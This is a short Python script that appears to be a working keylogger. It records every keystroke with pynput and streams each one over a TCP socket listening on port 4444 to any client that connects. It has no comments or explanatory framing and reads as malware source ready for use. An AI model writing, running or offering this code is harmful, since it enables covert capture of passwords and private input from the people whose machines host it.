from pynput.keyboard import Listener
from socket import *


s = socket(AF_INET, SOCK_STREAM)
s.bind(('0.0.0.0', 4444))
s.listen(2)

while True:
    obj, addr = s.accept()

    def on_press(key):
        key = str(key)

        if key == "Key.enter":
            obj.send(b"\n")
        
        elif key == "Key.space":
            obj.send(b" ")
        
        else:
            obj.send(bytes(key.replace("'", ""),"utf-8"))

    try:
        with Listener(on_press) as lis:
            lis.join()
    
    except:
        obj.close()
